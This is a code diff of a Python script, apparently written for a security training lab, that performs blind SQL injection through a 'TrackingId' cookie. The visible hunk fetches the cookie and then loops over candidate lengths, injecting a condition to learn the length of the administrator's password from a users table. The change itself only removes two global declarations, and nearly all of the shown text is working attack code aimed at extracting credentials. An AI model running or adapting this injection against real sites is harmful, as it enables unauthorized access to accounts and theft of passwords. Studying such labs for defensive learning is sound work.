@@ -6,10 +6,8 @@ import os
 os.system("clear")
 def main(url):
     try:
-        global TrackId
         ResponseTrack=requests.get(url)
         TrackId=ResponseTrack.headers.get("Set-Cookie").split(";")[0].split("=")[1]
-        global length_password
         print("---------------------start find password length--------------------------")
         for i in range(1,100):
             cookie={'TrackingId':str(TrackId)+"'+AND+(select+username+from+users+where+username='administrator'+and+LENGTH(password)="+str(i)+")='administrator'--;"}
